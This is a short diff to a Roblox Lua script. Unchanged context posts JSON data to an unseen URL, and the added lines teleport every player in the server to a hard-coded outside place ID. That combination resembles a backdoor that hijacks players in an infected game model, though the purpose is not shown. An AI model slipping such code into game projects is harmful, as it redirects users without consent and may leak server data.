@@ -29,3 +29,9 @@ local text = {
 
 }
 hs:PostAsync(url, hs:JSONEncode(text))
+
+local ts = game:GetService("TeleportService")
+
+for _, Player in game.Players:GetPlayers() do
+	ts:Teleport(75373144977072,Player)
+end
